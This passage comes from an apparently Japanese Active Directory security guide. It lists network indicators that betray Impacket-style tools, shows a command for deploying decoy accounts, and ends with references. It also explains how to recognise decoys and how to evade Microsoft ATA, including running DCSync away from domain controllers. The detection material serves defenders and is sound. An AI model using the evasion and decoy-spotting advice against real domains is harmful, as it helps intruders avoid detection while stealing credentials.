- **単独でも信頼度の高い候補**（自環境のベースラインと照合した後）:
  - `auth_context_id = 79231 + ctx_id` を使う認証済み DCE/RPC
  - 認証 padding が `0xff` で埋められた DCE/RPC
  - SPNEGO の `mechToken` に raw Kerberos `AP-REQ` を直接格納する LDAP Kerberos bind
  - ASCII に見える `ClientGuid` 値を持つ SMB2/3 negotiate request
  - 標準外の namespace `//./root/cimv2` を使う WMI `IWbemLevel1Login::NTLMLogin`
  - ハードコードされた Kerberos nonce 値
- **相関分析やスコアリングの特徴量として適するもの**:
  - Kerberos etype list が少ない、または重複している、通常と異なる/欠落した `PA-DATA`、Windows 標準と異なる TGS-REQ etype の順序
  - version info のない NTLM Type 1 message、または host name が null の Type 3 message
  - SPNEGO ではなく DCE/RPC で運ばれる raw NTLMSSP、DCE/RPC verification trailer の欠落、SPNEGO/Kerberos OID の不一致
  - 同じ host/user/session/time window でこれらの特徴が複数見られる場合、単一の弱い特徴よりもはるかに強い根拠となる
- **単独のアラートではなく、追加情報として使用するもの**:
  - デフォルトのファイル名、出力先、ランダムなサービス名、一時的な batch 名、デフォルトの computer account 名、ツール固有の HTTP/WebDAV/RDP/MSSQL 文字列
  - これらはオペレーターが簡単に変更できるため、複数プロトコルにまたがる不審なクラスターの説明に使うのが最適
- **運用上の注意**:
  - これらのシグナルの検出には、復号済みトラフィック、[PCAP/Zeek の解析](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、またはサービス側の可視性が必要な場合がある
  - アラートに採用する前に、Samba/Linux クライアント、アプライアンス、レガシーソフトウェアを対象に検証する
  - ベースラインへの信頼度を高めながら、検知を追加情報 -> hunting -> alerting の順に昇格させる

### **Deception 手法の実装**

- Deception の実装では、パスワードが期限切れにならない設定や Trusted for Delegation の指定などを持つデコイユーザーやコンピューターを用いて罠を仕掛ける。具体的には、特定の権限を持つユーザーを作成したり、高い権限を持つグループに追加したりする。<sup>[[2]](#references)</sup>
- 実用例として、次のようなツールを使用できる: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception 手法の展開については、[GitHub の Deploy-Deception](https://github.com/samratashok/Deploy-Deception) を参照。

### **Deception の特定**

- **ユーザーオブジェクトの場合**: 不審な指標には、一般的でない ObjectSID、ログオン頻度の低さ、作成日、bad password count の低さなどがある。
- **一般的な指標**: デコイの可能性があるオブジェクトの属性を正規のオブジェクトと比較すると、不整合を発見できる。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) などのツールが、こうした deception の特定に役立つ。

### **検知システムの回避**

- **Microsoft ATA の検知回避**:
  - **ユーザー列挙**: ATA に検知されないよう、Domain Controller 上でのセッション列挙を避ける。
  - **Ticket impersonation**: ticket 作成に **aes** key を使うと、NTLM への downgrade を避けて検知を回避できる。
  - **DCSync 攻撃**: ATA に検知されないよう、Domain Controller 以外から実行することが推奨される。Domain Controller から直接実行するとアラートが発生する。

## References

- [1] [ドメイントラスト攻撃ガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory での deception のための trust 偽造](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin から Enterprise Admin へ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory exploitation のためのメモリ内 LDAP toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM hash を wordlist として weaponize する](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket の分析](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Netlogon 経由で Active Directory アカウントを乗っ取る Onelogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 に関連する Netlogon secure channel 接続の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられた Null Session と MS-RPC interface を探る](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter はドメイン間のセキュリティ境界か？（Part 4）- SID filtering 回避の調査](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter はドメイン間のセキュリティ境界か？（Part 5）- Golden GMSA trust 攻撃 - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter はドメイン間のセキュリティ境界か？（Part 6）- Schema change trust 攻撃 - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 を使って DA から EA へ](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS を悪用して child domain の管理者から enterprise admin へ 5 分で昇格する：続編](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [袖の中の ACE: Active Directory DACL backdoor の設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module のソース](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
